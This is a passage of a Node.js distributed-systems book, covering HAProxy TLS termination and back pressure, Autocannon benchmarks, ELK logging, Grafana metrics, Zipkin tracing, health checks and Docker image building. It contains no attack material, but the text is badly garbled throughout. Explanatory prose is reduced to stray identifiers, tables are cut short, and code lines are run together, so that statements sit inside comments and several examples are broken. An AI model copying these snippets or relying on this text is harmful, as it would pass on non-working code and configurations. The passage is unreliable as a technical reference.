+Figure 3-4. HAProxy TLS termination
+
+Example 3-7. Generating a .pem file
+$ openssl req -nodes -new -x509 \
+-keyout haproxy/private.key \
+-out haproxy/certificate.cert
+$ cat haproxy/certificate.cert haproxy/private.key \
+>haproxy/combined.pem
+inbound frontend to listen via HTTPS and to load the combined.pem file.
+Example 3-8. haproxy/tls.cfg
+defaults mode http
+timeout connect 5000ms timeout client 50000ms timeout server 50000ms
+
+global 
+tune.ssl.default-dh-param 2048
+
+frontend inbound
+bind localhost:3000 ssl crt haproxy/combined.pem  default_backend web-api
+
+backend web-api
+server web-api-1 localhost:3001
+global ssl crt global 
+$ node recipe-api/producer-http-basic.js	# terminal 1
+$ PORT=3001 node web-api/consumer-http-basic.js # terminal 2
+$ haproxy -f haproxy/tls.cfg	# terminal 3
+$ curl --insecure https://localhost:3000/	# terminal 4
+
+curl --insecure Rate Limiting and Back Pressure
+
+maxConnections http.Server http.Server http Example 3-9. low-connections.js
+#!/usr/bin/env node
+
+const http = require('http');
+
+const server = http.createServer((req, res) => { console.log('current conn', server._connections); setTimeout(() => res.end('OK'), 10_000); 
+});
+
+server.maxConnections = 2;  server.listen(3020, 'localhost');
+setTimeout() curl curl $ node low-connections.js	# terminal 1
+
+$ curl http://localhost:3020/ # terminals 2-4
+
+curl OK curl curl: (56) Recv failure: Connection reset by
+peerserver.maxConnections Example 3-10. haproxy/backpressure.cfg
+defaults maxconn 8  mode http
+
+frontend inbound
+bind localhost:3010 default_backend web-api
+
+backend web-api option httpclose 
+server web-api-1 localhost:3020 maxconn 2 
+
+maxconn 8maxconn 2 option httpclose server.maxConnections curl $ node low-connections.js	# terminal 1
+$ haproxy -f haproxy/backpressure.cfg # terminal 2
+$ curl http://localhost:3010/	# terminals 3-5
+
+curl curl 
+current conn 1
+current conn 2
+current conn 2
+
+server.maxConnections maxconn SLA and Load Testing
+
+Introduction to Autocannon
+
+sudo $ npm install -g autocannon@6
+
+
+Running a Baseline Load Test
+
+Example 3- 1. benchmark/native-http.js
+#!/usr/bin/env node
+
+const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 4000;
+
+require("http").createServer((req, res) => { res.end('ok');
+}).listen(PORT, () => {
+console.log(`Producer running at http://${HOST}:${PORT}`);
+});
+$ node benchmark/native-http.js
+$ autocannon -d 60 -c 10 -l http://localhost:4000/
+
+-d -c - l GET POST Table 3-6. Autocannon request latency
+Stat	2.5% 50% 97.5% 99% Avg	Stdev  Max
+
+Latency 0ms	0ms	0ms	0ms	0.01ms 0.08ms 9.45ms
+
+Table 3-7. Autocannon request volume
+Stat	1%	2.5%	50%	97.5%  Avg	Stdev	Min
+
+
+-l 
+
+Table 3-8. Autocannon detailed latency results
+
+Percentile	Latency	Percentile	Latency	Percentile	Latency
+0.001%	0ms	10%	0ms	97.5%	0ms
+0.01%	0ms	25%	0ms	99%	0ms
+0.1%	0ms	50%	0ms	99.9%	1ms
+1%	0ms	75%	0ms	99.99%	2ms
+2.5%	0ms	90%	0ms	99.999%	3ms
+Figure 3-5. Autocannon latency results graph
+
+
+Reverse Proxy Concerns
+Establishing a baseline
+Example 3-12. haproxy/benchmark-basic.cfg
+defaults mode http
+
+frontend inbound
+bind localhost:4001 default_backend native-http
+
+backend native-http
+server native-http-1 localhost:4000
+$ node benchmark/native-http.js
+$ haproxy -f haproxy/benchmark-basic.cfg
+$ autocannon -d 60 -c 10 -l http://localhost:4001
+
+
+
+HTTP compression
+
+Figure 3-6. HAProxy latency
+
+mode tcp Example 3-13. haproxy/passthru.cfg
+defaults mode tcp
+timeout connect 5000ms timeout client 50000ms timeout server 50000ms
+
+frontend inbound
+bind localhost:3000
+
+default_backend server-api
+
+backend server-api
+server server-api-1 localhost:3001
+Use the same server-gzip.js file that was created in Example 2-4, though you’ll want to comment out the console.log calls. The same haproxy/compression.cfg file created in Example 3-6 will also be used, as well as the haproxy/passthru.cfg
+$ rm index.html ; curl -o index.html https://thomashunter.name
+$ PORT=3001 node server-gzip.js
+$ haproxy -f haproxy/passthru.cfg
+$ autocannon -H "Accept-Encoding: gzip" \
+-d 60 -c 10 -l http://localhost:3000/ # Node.js # Kill the previous haproxy process
+$ haproxy -f haproxy/compression.cfg
+$ autocannon -H "Accept-Encoding: gzip" \
+-d 60 -c 10 -l http://localhost:3000/ # HAProxy
+
+
+Figure 3-7. Node.js gzip compression latency
+
+TLS termination
+
+Figure 3-8. HAProxy gzip compression latency
+
+ First, performing TLS termination within the Node.js process is tested. For this test use the same recipe-api/producer-https-basic.js file that you created in
+
+console.log $ PORT=3001 node recipe-api/producer-https-basic.js
+$ haproxy -f haproxy/passthru.cfg
+$ autocannon -d 60 -c 10 https://localhost:3000/recipes/42
+
+Table 3-9. Native Node.js TLS termination throughput
+Stat	1%	2.5%	50%	97.5%	Avg	Stdev	Min
+
+Req/Sec	7,263	11,991	13,231 18,655	13,580.7  1,833.58 7,263
+
+Next, to test HAProxy, make use of the recipe-api/producer-http-basic.js file created back in Example 1-6 (again, comment out the console.log calls), as well as the haproxy/tls.cfg file from Example 3-8:
+$ PORT=3001 node recipe-api/producer-http-basic.js
+$ haproxy -f haproxy/tls.cfg
+$ autocannon -d 60 -c 10 https://localhost:3000/recipes/42
+
+Table 3-10. HAProxy TLS termination throughput
+Stat    1%   2.5%  50%   97.5% Avg   Stdev  Min
+
+
+Protocol Concerns
+
+Figure 3-9. Benchmarking in the cloud
+TARGET <RECIPE_API_IP> recipe-api service in each of the following examples.
+JSON over HTTP benchmarks
+This first load test will benchmark the recipe-api/producer-http-basic.js service created in Example 1-6 by sending requests through the web-api/consumer-http- basic.js service created in Example 1-7:
+# Server VPS
+$ HOST=0.0.0.0 node recipe-api/producer-http-basic.js # Client VPS
+$ TARGET=<RECIPE_API_IP>:4000 node web-api/consumer-http-basic.js
+
+$ autocannon -d 60 -c 10 -l http://localhost:3000
+
+Figure 3-10. Benchmarking JSON over HTTP
+GraphQL benchmarks
+This next load test will use the recipe-api/producer-graphql.js service created in Example 2-11 by sending requests through the web-api/consumer-graphql.js service created in Example 2-12:
+# Server VPS
+$ HOST=0.0.0.0 node recipe-api/producer-graphql.js # Client VPS
+$ TARGET=<RECIPE_API_IP>:4000 node web-api/consumer-graphql.js
+$ autocannon -d 60 -c 10 -l http://localhost:3000
+
+
+
+gRPC benchmarks
+
+Figure 3-11. Benchmarking GraphQL
+
+This final load test will test the recipe-api/producer-grpc.js service created in Example 2-14 by sending requests through the web-api/consumer-grpc.js service created in Example 2-15:
+# Server VPS
+$ HOST=0.0.0.0 node recipe-api/producer-grpc.js # Client VPS
+$ TARGET=<RECIPE_API_IP>:4000 node web-api/consumer-grpc.js
+$ autocannon -d 60 -c 10 -l http://localhost:3000
+
+
+Conclusion
+
+Figure 3-12. Benchmarking gRPC
+
+JSON.stringify() Buffer Coming Up with SLOs
+
+Figure 3-13. Benchmarking a production application
+
+-R Example 3-14. haproxy/fibonacci.cfg
+defaults mode http
+
+frontend inbound
+bind localhost:5000 default_backend fibonacci
+
+backend fibonacci
+server fibonacci-1 localhost:5001 # server fibonacci-2 localhost:5002 # server fibonacci-3 localhost:5003
+
+sleep() // Add this line inside the server.get async handler await sleep(10);
+
+// Add this function to the end of the file function sleep(ms) {
+return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+$ PORT=5001 node cluster-fibonacci.js # later run with 5002 & 5003
+$ haproxy -f haproxy/fibonacci.cfg
+$ autocannon -d 60 -c 10 -R 10 http://localhost:5000/10000
+
+-R Next, uncomment the second-to-last line of the haproxy/fibonacci.cfg file. Also, run another instance of cluster-fibonacci.js, setting the PORT value to 5002.
+Table 3- 1. Fibonacci SLO
+Instance count 1  2  3
+
+	The fork() method name is inspired by the fork system call, though the two are technically unrelated.
+1	More advanced applications might have some race-conditions unearthed when running multiple copies.
+2	This backend has a balance <algorithm> directive implicitely set to roundrobin. It can be set to leastconn to route requests to the instance with the fewest connections, source to consistently route a client by IP to an instance, and several other algorithm options are also available.
+3	You’ll need to manually refresh it any time you want to see updated statistics; the page only displays a static snapshot.
+4Regardless of performance, it’s necessary that services exposed to the internet are encrypted.
+
+Chapter 4. Observability
+
+
+console.log() console.log()
+Environments
+NODE_ENV $ export NODE_ENV=production
+$ node server.js
+
+Development
+
+Staging
+Production
+Logging with ELK
+ELK, or more specifically, the ELK stack, is a reference to Elasticsearch,
+
+Elasticsearch
+:9200Logstash
+:7777Kibana
+:5601Figure 4-1. The ELK stack
+
+Running ELK via Docker
+-v Example 4-1. misc/elk/udp.conf
+input { udp {
+id => "nodejs_udp_logs" port => 7777
+codec => json
+}
+}
+output { elasticsearch {
+hosts => ["localhost:9200"] document_type => "nodelog" manage_template => false
+index => "nodejs-%{+YYYY.MM.dd}"
+}
+}
+
+
+sysctl -e sysctl Example 4-2. Running ELK within Docker
+$ sudo sysctl -w vm.max_map_count=262144 # Linux Only
+$ docker run -p 5601:5601 -p 9200:9200 \
+-p 5044:5044 -p 7777:7777/udp \
+-v $PWD/misc/elk/udp.conf:/etc/logstash/conf.d/99-input-udp.conf \
+-e MAX_MAP_COUNT=262144 \
+-it --name distnode-elk sebp/elk:683
+Transmitting Logs from Node.js
+For this example, you’re going to again start by modifying an existing application. Copy the web-api/consumer-http-basic.js file created in Example 1- 7 to web-api/consumer-http-logs.js as a starting point. Next, modify the file to look like the code in Example 4-3.
+Example 4-3. web-api/consumer-http-logs.js
+#!/usr/bin/env node
+
+// npm install fastify@3.2 node-fetch@2.6 middie@5.1 const server = require('fastify')();
+const fetch = require('node-fetch');
+const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 3000;
+const TARGET = process.env.TARGET || 'localhost:4000'; const log = require('./logstash.js'); 
+
+(async () => {
+await server.register(require('middie'));  server.use((req, res, next) => { 
+log('info', 'request-incoming', { 
+path: req.url, method: req.method, ip: req.ip, ua: req.headers['user-agent'] || null });
+
+next();
+});
+server.setErrorHandler(async (error, req) => { log('error', 'request-failure', {stack: error.stack, 
+path: req.url, method: req.method, }); return { error: error.message };
+});
+server.get('/', async () => {
+const url = `http://${TARGET}/recipes/42`;
+log('info', 'request-outgoing', {url, svc: 'recipe-api'});  const req = await fetch(url);
+const producer_data = await req.json();
+return { consumer_pid: process.pid, producer_data };
+});
+server.get('/error', async () => { throw new Error('oh no'); }); server.listen(PORT, HOST, () => {
+log('verbose', 'listen', {host: HOST, port: PORT}); 
+});
+})();
+The new logstash.js file is now being loaded.
+middie @log4js- node/logstashudp 
+Example 4-4. web-api/logstash.js
+const client = require('dgram').createSocket('udp4');  const host = require('os').hostname();
+const [LS_HOST, LS_PORT] = process.env.LOGSTASH.split(':');  const NODE_ENV = process.env.NODE_ENV;
+
+module.exports = function(severity, type, fields) { const payload = JSON.stringify({ 
+'@timestamp': (new Date()).toISOString(),
+"@version": 1, app: 'web-api', environment: NODE_ENV, severity, type, fields, host
+});
+console.log(payload); client.send(payload, LS_PORT, LS_HOST);
+};
+dgram LOGSTASH@timestampapp severity typefields
+severity 
+watch Example 4-5. Running web-api and generating logs
+$ NODE_ENV=development LOGSTASH=localhost:7777 \ node web-api/consumer-http-logs.js
+$ node recipe-api/producer-http-basic.js
+$ brew install watch # required for macOS
+$ watch -n5 curl http://localhost:3000
+$ watch -n13 curl http://localhost:3000/error
+watch Creating a Kibana Dashboard
+nodejs-*
+@timestamp nodejs-* Figure 4-2. Kibana visualizations
+nodejs-* nodejs-*
+typeisrequest-incoming appis
+web-api
+@timestamp Figure 4-3. Requests over time in Kibana
+request-outgoing that visualization web-api outgoing requests. Finally, create a third visualization
+with a type field of listen and name it web-api server starts.
+
+Running Ad-Hoc Queries
+app:"web-api" AND (severity:"error" OR severity:"warn")
+
+PUT /recipe 
+Metrics with Graphite, StatsD, and Grafana
+
+Graphite
+StatsD
+Grafana
+Figure 4-4. Graphite, StatsD, and Grafana
+
+Running via Docker
+:8080:8125:8000Example 4-6. Running StatsD + Graphite, and Grafana
+$ docker run \
+-p 8080:80 \
+-p 8125:8125/udp \
+-it --name distnode-graphite graphiteapp/graphite-statsd:1.1.6-1
+$ docker run \
+-p 8000:3000 \
+-it --name distnode-grafana grafana/grafana:6.5.2
+
+Table 4-1. Configuring Grafana to use Graphite
+Name	Dist Node Graphite
+Transmitting Metrics from Node.js
+foo.bar.baz foo.bar.baz:1|c
+
+dgram statsd-client
+
+Again, start by rebuilding a version of the consumer service. Copy the web- api/consumer-http-basic.js file created in Example 1-7 to web-api/consumer- http-metrics.js as a starting point. From there, modify the file to resemble Example 4-7. Be sure to run the npm install command to get the required
+Example 4-7. web-api/consumer-http-metrics.js (first half)
+#!/usr/bin/env node
+
+// npm install fastify@3.2 node-fetch@2.6 statsd-client@0.4.4 middie@5.1 const server = require('fastify')();
+const fetch = require('node-fetch'); const HOST = '127.0.0.1';
+const PORT = process.env.PORT || 3000;
+const TARGET = process.env.TARGET || 'localhost:4000'; const SDC = require('statsd-client');
+const statsd = new (require('statsd-client'))({host: 'localhost', port: 8125, prefix: 'web-api'}); 
+
+(async () => {
+await server.register(require('middie')); server.use(statsd.helpers.getExpressMiddleware('inbound', { 
+timeByUrl: true})); server.get('/', async () => {
+const begin = new Date();
+const req = await fetch(`http://${TARGET}/recipes/42`); statsd.timing('outbound.recipe-api.request-time', begin);  statsd.increment('outbound.recipe-api.request-count');  const producer_data = await req.json();
+
+return { consumer_pid: process.pid, producer_data };
+});
+server.get('/error', async () => { throw new Error('oh no'); }); server.listen(PORT, HOST, () => {
+console.log(`Consumer running at http://${HOST}:${PORT}/`);
+});
+})();
+web-api
+statsd-client localhost:8125web-apistatsd-client inbound outbound.recipe-api.request-timeoutbound.recipe-
+api.request-count$ NODE_DEBUG=statsd-client node web-api/consumer-http-metrics.js
+$ node recipe-api/producer-http-basic.js
+$ autocannon -d 300 -R 5 -c 1 http://localhost:3000
+$ watch -n1 curl http://localhost:3000/error
+
+Creating a Grafana Dashboard
+
+stats_count web-apiinboundresponse_code* * aliasByNode(stats_counts.web-api.inbound.response_code.*, 4)
+
+aliasByNode(stats.timers.web-api.outbound.*.request-time.upper_90, 4)
+
+
+aliasByNode(stats_counts.web-api.outbound.*.request-count, 3)
+
+
+Figure 4-5. Completed Grafana dashboard
+Node.js Health Indicators
+Example 4-8. web-api/consumer-http-metrics.js (second half)
+const v8 = require('v8'); const fs = require('fs');
+
+setInterval(() => {
+statsd.gauge('server.conn', server.server._connections); 
+
+const m = process.memoryUsage();  statsd.gauge('server.memory.used', m.heapUsed); statsd.gauge('server.memory.total', m.heapTotal);
+
+const h = v8.getHeapStatistics();  statsd.gauge('server.heap.size', h.used_heap_size); statsd.gauge('server.heap.limit', h.heap_size_limit);
+
+fs.readdir('/proc/self/fd', (err, list) => { if (err) return;
+statsd.gauge('server.descriptors', list.length); 
+});
+
+const begin = new Date();
+setTimeout(() => { statsd.timing('eventlag', begin); }, 0); 
+}, 10_000);
+stats.gaugesstats.timersserver.connserver.memory.used server.memory.total
+setTimeout() Figure 4-6. Updated Grafana dashboard
+
+Distributed Request Tracing with Zipkin
+
+request_id How Does Zipkin Work?
+
+Figure 4-7. Example requests and Zipkin data
+[{
+
+"id":	"0000000000000111",
+"traceId": "0000000000000100",
+"parentId": "0000000000000110",
+"timestamp": 1579221096510000,
+"name": "get_recipe", "duration": 80000, "kind": "CLIENT", "localEndpoint": {
+"serviceName": "web-api", "ipv4": "127.0.0.1", "port": 100
+},
+"remoteEndpoint": { "ipv4": "127.0.0.2", "port": 200 }, "tags": {
+"http.method": "GET", "http.path": "/recipe/42", "diagram": "C2"
+}
+}]
+
+idtraceIdparentId timestamp duration Date.now() kind CLIENT SERVERname localEndpoint SERVER CLIENT remoteEndpoint SERVER portnametags http.method http.path
+Table 4-2. Values reported from Figure 4-7
+
+Message	id	parentId	traceId	kind
+S1	110	N/A	100	SERVER
+C2	111	110	100	CLIENT
+S2	111	110	100	SERVER
+C3	121	110	100	CLIENT
+S3	121	110	100	SERVER
+C4	122	121	100	CLIENT
+S4	122	121	100	SERVER
+X-B3-TraceId
+X-B3-SpanId
+X-B3-ParentSpanId
+
+X-B3-Sampled
+X-B3-Flags
+Running Zipkin via Docker
+9411 
+
+$ docker run -p 9411:9411 \
+-it --name distnode-zipkin \ openzipkin/zipkin-slim:2.19
+
+Transmitting Traces from Node.js
+For this example, you’re going to again start by modifying an existing application. Copy the web-api/consumer-http-basic.js file created in Example 1- 7 to web-api/consumer-http-zipkin.js as a starting point. Modify the file to look like the code in Example 4-9.
+
+Example 4-9. web-api/consumer-http-zipkin.js
+#!/usr/bin/env node
+
+// npm install fastify@3.2 node-fetch@2.6 zipkin-lite@0.1 const server = require('fastify')();
+const fetch = require('node-fetch');
+const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 3000;
+const TARGET = process.env.TARGET || 'localhost:4000'; const ZIPKIN = process.env.ZIPKIN || 'localhost:9411'; const Zipkin = require('zipkin-lite');
+const zipkin = new Zipkin({  zipkinHost: ZIPKIN,
+serviceName: 'web-api', servicePort: PORT, serviceIp: HOST, init: 'short' 
+});
+server.addHook('onRequest', zipkin.onRequest());  server.addHook('onResponse', zipkin.onResponse());
+
+server.get('/', async (req) => { req.zipkin.setName('get_root'); 
+
+const url = `http://${TARGET}/recipes/42`; const zreq = req.zipkin.prepare(); 
+const recipe = await fetch(url, { headers: zreq.headers }); zreq.complete('GET', url);
+const producer_data = await recipe.json();
+
+return {pid: process.pid, producer_data, trace: req.zipkin.trace};
+});
+
+server.listen(PORT, HOST, () => {
+console.log(`Consumer running at http://${HOST}:${PORT}/`);
+});
+zipkin-lite 
+init serviceNameservicePortserviceIp onRequest onResponse zipkin-lite onRequest req.zipkin onResponse SERVER req.zipkin.setName()req.zipkin.prepare()zreqzreq.headerszreq.complete() CLIENT Next up, the producing service should also be modified. This is important because not only should the timing as perceived by the client be reported (web- api in this case), but the timing from the server’s point of view (recipe-api) should be reported as well. Copy the recipe-api/producer-http-basic.js file created in Example 1-6 to recipe-api/producer-http-zipkin.js as a starting point.
+
+Example 4-10. recipe-api/producer-http-zipkin.js (truncated)
+const PORT = process.env.PORT || 4000;
+const ZIPKIN = process.env.ZIPKIN || 'localhost:9411'; const Zipkin = require('zipkin-lite');
+const zipkin = new Zipkin({ zipkinHost: ZIPKIN,
+serviceName: 'recipe-api', servicePort: PORT, serviceIp: HOST,
+});
+server.addHook('onRequest', zipkin.onRequest()); server.addHook('onResponse', zipkin.onResponse());
+
+server.get('/recipes/:id', async (req, reply) => { req.zipkin.setName('get_recipe');
+const id = Number(req.params.id);
+
+init req.zipkin.prepare() Be sure to run the npm install zipkin-lite@0.1 command in both project directories.
+$ node recipe-api/producer-http-zipkin.js
+$ node web-api/consumer-http-zipkin.js
+$ curl http://localhost:3000/
+
+tracecurl e232bb26a7941aabVisualizing a Request Tree
+
+http://localhost:9411/zipkin/
+
+curl Figure 4-8. Zipkin discover interface
+SERVER 
+Figure 4-9. Example Zipkin trace timeline
+Visualizing Microservice Dependencies
+
+Figure 4-10. Example Zipkin dependency view
+
+Health Checks
+
+setInterval() Building a Health Check
+Example 4- 1. Running Postgres and Redis
+$ docker run \
+--rm \
+-p 5432:5432 \
+-e POSTGRES_PASSWORD=hunter2 \
+-e POSTGRES_USER=tmp \
+-e POSTGRES_DB=tmp \ postgres:12.3
+$ docker run \
+--rm \
+-p 6379:6379 \
+redis:6.0
+
+Example 4-12. basic-http-healthcheck.js
+#!/usr/bin/env node
+
+// npm install fastify@3.2 ioredis@4.17 pg@8.3 const server = require('fastify')();
+const HOST = '0.0.0.0';
+const PORT = 3300;
+const redis = new (require("ioredis"))({enableOfflineQueue: false});  const pg = new (require('pg').Client)();
+pg.connect(); // Note: Postgres will not reconnect on failure
+
+server.get('/health', async (req, reply) => { try {
+const res = await pg.query('SELECT $1::text as status', ['ACK']); if (res.rows[0].status !== 'ACK') reply.code(500).send('DOWN');
+} catch(e) { reply.code(500).send('DOWN'); 
+}
+// ... other down checks ... let status = 'OK';
+try {
+if (await redis.ping() !== 'PONG') status = 'DEGRADED';
+} catch(e) {
+status = 'DEGRADED'; 
+}
+// ... other degraded checks ... reply.code(200).send(status);
+});
+
+server.listen(PORT, HOST, () => console.log(`http://${HOST}:${PORT}/`));
+ioredis pg ioredis enableOfflineQueue truefalse
+pg $ PGUSER=tmp PGPASSWORD=hunter2 PGDATABASE=tmp \ node basic-http-healthcheck.js
+
+pg Testing the Health Check
+
+$ curl -v http://localhost:3300/health
+
+OK ioredis curl DEGRADEDcurlDEGRADED OK ioredis pg ioredis Alerting with Cabot
+
+Create a Twilio Trial Account
+AC 
+Running Cabot via Docker
+$ git clone git@github.com:cabotapp/docker-cabot.git cabot
+$ cd cabot
+$ git checkout 1f846b96
+
+Example 4-13. config/production.env
+TIME_ZONE=America/Los_Angeles  ADMIN_EMAIL=admin@example.org CABOT_FROM_EMAIL=cabot@example.org DJANGO_SECRET_KEY=abcd1234
+WWW_HTTP_HOST=localhost:5000 WWW_SCHEME=http
+
+# GRAPHITE_API=http://<YOUR-IP-ADDRESS>:8080/ 
+
+TWILIO_ACCOUNT_SID=<YOUR_TWILIO_ACCOUNT_SID>  TWILIO_AUTH_TOKEN=<YOUR_TWILIO_AUTH_TOKEN> TWILIO_OUTGOING_NUMBER=<YOUR_TWILIO_NUMBER>
+$ docker-compose up
+
+Creating a Health Check
+
+adminadmin Table 4-3. Fields for creating a service in Cabot
+Name	Dist Node Service
+<LOCAL_IP> Table 4-4. Fields for creating an HTTP check in Cabot
+Name	Dist Node HTTP Health
+
+Active	checked
+admin Sent from your Twilio trial account - Service Dist Node Service reporting CRITICAL status: http://localhost:5000/service/1/
+
+
+Figure 4-11. Cabot service status screenshot
+$ docker rm cabot_postgres_1 cabot_rabbitmq_1 \ cabot_worker_1 cabot_beat_1 cabot_web_1
+
+
+pagerduty 	Note that process.hrtime() is only useful for getting relative time and can’t be used to get the current time with microsecond accuracy.
+1This example doesn’t persist data to disk and isn’t appropriate for production use.
+
+Chapter 5. Containers
+
+
+
+
+Figure 5-1. Classic versus virtual machines versus containers
+Introduction to Docker
+dockerd docker 
+FROM FROM
+alpine:3.11 alpine 3.11 FROM node:lts- alpine3.11 
+FROM 
+Figure 5-2. Images contain layers, and layers contribute to the filesystem
+docker run npm install $ docker images
+
+REPOSITORY	TAG	IMAGE ID	CREATED	SIZE
+
+grafana/grafana	6.5.2	7a40c3c56100	8	weeks ago	228MB
+grafana/grafana	latest	7a40c3c56100	8	weeks ago	228MB
+openzipkin/zipkin	latest	12ee1ce53834	2	months ago	157MB
+openzipkin/zipkin-slim	2.19	c9db4427dbdd	2	months ago	124MB
+graphiteapp/graphite-statsd	1.1.6-1	5881ff30f9a5	3	months ago	423MB
+sebp/elk	latest	99e6d3f782ad	4	months ago	2.06GB
+
+sebp/elklatest <none>grafana/grafana 6.5.2 latest latest $ docker history grafana/grafana:6.5.2
+
+IMAGE	CREATED BY	SIZE
+7a40c3c56100  /bin/sh -c #(nop)  ENTRYPOINT ["/run.sh"]	0B
+<missing>	/bin/sh -c #(nop) USER grafana	0B
+<missing>	/bin/sh -c #(nop) COPY file:3e1dfb34fa628163…	3.35kB
+<missing>	/bin/sh -c #(nop) EXPOSE 3000	0B
+<missing>	|2 GF_GID=472 GF_UID=472 /bin/sh -c mkdir -p…	28.5kB
+<missing>	/bin/sh -c #(nop) COPY dir:200fe8c0cffc35297…	177MB
+
+<missing>	|2 GF_GID=472 GF_UID=472 /bin/sh -c if [ `ar…	18.7MB
+<missing>	|2 GF_GID=472 GF_UID=472 /bin/sh -c if [ `ar…	15.6MB
+<missing>	|2 GF_GID=472 GF_UID=472 /bin/sh -c apk add …	10.6MB
+... <TRUNCATED RESULTS> ...
+<missing>	/bin/sh -c #(nop) ADD file:fe1f09249227e2da2…	5.55MB
+
+docker history docker pull $ docker pull node:lts-alpine
+
+lts-alpine: Pulling from library/node c9b1b535fdd9: Pull complete
+750cdd924064: Downloading [=====>	] 2.485MB/24.28MB
+2078ab7cf9df: Download complete 02f523899354: Download complete
+
+docker pull node:lts 
+bash $ docker run -it --rm --name ephemeral ubuntu /bin/bash
+
+-i -t -it--rm
+--name
+ubuntu ubuntu:latest/bin/bash ps -e
+PID TTY	TIME CMD
+1 pts/0	00:00:00 bash
+10 pts/0	00:00:00 ps
+
+bashpssystemd initbash $ docker ps
+
+ps 
+CONTAINER ID IMAGE	COMMAND	CREATED	PORTS NAMES
+527847ba22f8 ubuntu "/bin/bash"	11 minutes ago	ephemeral
+
+execdocker exec ephemeral /bin/ls /var exit--rm docker ps docker ps --all -v --
+volume --mount -p --publish 
+$ rm index.html ; curl -o index.html http://example.org
+$ docker run --rm -p 8080:80 \
+-v $PWD:/usr/share/nginx/html nginx
+
+volume publish -p 8080:80-v $PWD:/usr/share/nginx/html -v $PWD .volume mount volume 
+Containerizing a Node.js Service
+chokidar fsevents postinstall preinstall 
+Example 5-1. recipe-api/.dockerignore
+node_modules npm-debug.log Dockerfile
+
+Dependency Stage
+Example 5-2. recipe-api/Dockerfile “deps” stage
+FROM node:14.8.0-alpine3.12 AS deps
+
+WORKDIR /srv
+COPY package*.json ./
+RUN npm ci --only=production
+# COPY package.json yarn.lock ./ # RUN yarn install --production
+
+FROMnode:14.8.0- alpine3.12 FROM 
+depsWORKDIR /srv cd COPY package*.json (specifically package.json and package-lock.json) will be copied to ./ within the container (being the /srv directory). Alternatively, if you prefer to use yarn, you would instead copy the yarn.lock file.
+RUN npm ci -- only=production npm ci npm install yarn install -- productionnpm yarn node Release Stage
+Example 5-3. recipe-api/Dockerfile “release” stage part one	
+
+FROM alpine:3.12 AS release
+
+ENV V 14.8.0
+ENV FILE node-v$V-linux-x64-musl.tar.xz
+
+RUN apk add --no-cache libstdc++ \
+&& apk add --no-cache --virtual .deps curl \ && curl -fsSLO --compressed \
+"https://unofficial-builds.nodejs.org/download/release/v$V/$FILE" \ && tar -xJf $FILE -C /usr/local --strip-components=1 \
+&& rm -f $FILE /usr/local/bin/npm /usr/local/bin/npx \ && rm -rf /usr/local/lib/node_modules \
+&& apk del .deps
+alpine npm yarn alpine V FILE RUN RUN
+apkRUN apk add--no-cache apk 
+libstdc++curl-
+-virtual .deps apk curl tar rm apk del .deps curl Example 5-4. recipe-api/Dockerfile “release” stage part two
+WORKDIR /srv
+COPY --from=deps /srv/node_modules ./node_modules COPY . .
+
+EXPOSE 1337
+ENV HOST 0.0.0.0
+ENV PORT 1337
+CMD [ "node", "producer-http-basic.js" ]
+
+/srvCOPY --from COPY /srv/node_modules directory from the deps stage is being copied to the
+release COPY directory (. with a WORKDIR of /srv). This is where the .dockerignore file comes
+
+deps COPY . EXPOSE ENV HOST PORT 127.0.0.1 CMD node 
+
+From Image to Container
+Example 5-5. Building an image from a Dockerfile
+$ cd recipe-api
+$ docker build -t tlhunter/recipe-api:v0.0.1 .
+docker build -t repository/name:versionv0.0.1latestSending build context to Docker daemon 155.6kB Step 1/15 : FROM node:14.8.0-alpine3.12 AS deps
+---> 532fd65ecacd
+... TRUNCATED ...
+
+Step 15/15 : CMD [ "node", "producer-http-basic.js" ]
+---> Running in d7bde6cfc4dc
+Removing intermediate container d7bde6cfc4dc
+---> a99750d85d81
+Successfully built a99750d85d81
+Successfully tagged tlhunter/recipe-api:v0.0.1
+
+$ docker run --rm --name recipe-api-1 \
+-p 8000:1337 tlhunter/recipe-api:v0.0.1
+
+--rm --name recipe-api-1-p worker pid=1service is listening at http://0.0.0.0:1337. This is the interface and port that the Node.js service is available at within the container.
+
+$ curl http://localhost:8000/recipes/42
+
+$ docker kill recipe-api-1
+
+Rebuilding and Versioning an Image
+docker build 532fd65ecacd, bec6e0fc4a96, 58341ced6003, dd6cd3c5a283, e7d92cdc71fe, 4f2ea97869f7, b5b203367e62, 0dc0f7fddd33, 4c9a03ee9903, a86f6f94fc75, cab24763e869, 0efe3d9cd543, 9104495370ba, 04d6b8f0afce, b3babfadde8e
+
+Next, make a change to the .recipe-api/producer-http-basic.js file (the entrypoint to the application) by replacing the route handler with the code in Example 5-6.
+Example 5-6. recipe-api/producer-http-basic.js, truncated
+server.get('/recipes/:id', async (req, reply) => {
+
+return "Hello, world!";
+});
+
+build 532fd65ecacd, bec6e0fc4a96, 58341ced6003, dd6cd3c5a283, e7d92cdc71fe, 4f2ea97869f7, b5b203367e62, 0dc0f7fddd33, 4c9a03ee9903, a86f6f94fc75, 7f6f49f5bc16, 4fc6b68804c9, df073bd1c682, f67d0897cb11, 9b6514336e72
+
+COPY . . $ npm install --save-exact left-pad@1.3.0
+
+COPY deps 532fd65ecacd, bec6e0fc4a96, 959c7f2c693b, 6e9065bacad0, e7d92cdc71fe, 4f2ea97869f7, b5b203367e62, 0dc0f7fddd33, 4c9a03ee9903, b97b002f4734, f2c9ac237a1c, f4b64a1c5e64, fee5ff92855c, 638a7ff0c240, 12d0c7e37935
+
+release COPY --from=deps deps deps release 
+$ docker history tlhunter/recipe-api:v0.0.1
+
+ENVCMDEXPOSEWORKDIR FROM
+... release RUN
+apk add COPY . . 140kB COPY -- from=deps left-pad 
+Table 5-1. Docker image layers comparison
+
+Layer	Size	v0.0.1	v0.0.2	v0.0.3
+1: FROM node AS deps	N/A	
+532fd65ecacd	
+532fd65ecacd	
+532fd65ecacd
+2: WORKDIR /srv	N/A	
+bec6e0fc4a96	
+bec6e0fc4a96	
+bec6e0fc4a96
+3: COPY package*	N/A	
+58341ced6003	
+58341ced6003	
+959c7f2c693b
+4: RUN npm ci	N/A	
+dd6cd3c5a283	
+dd6cd3c5a283	
+6e9065bacad0
+5: FROM alpine AS release	5.6MB	
+e7d92cdc71fe	
+e7d92cdc71fe	
+e7d92cdc71fe
+6: ENV V	0	
+4f2ea97869f7	
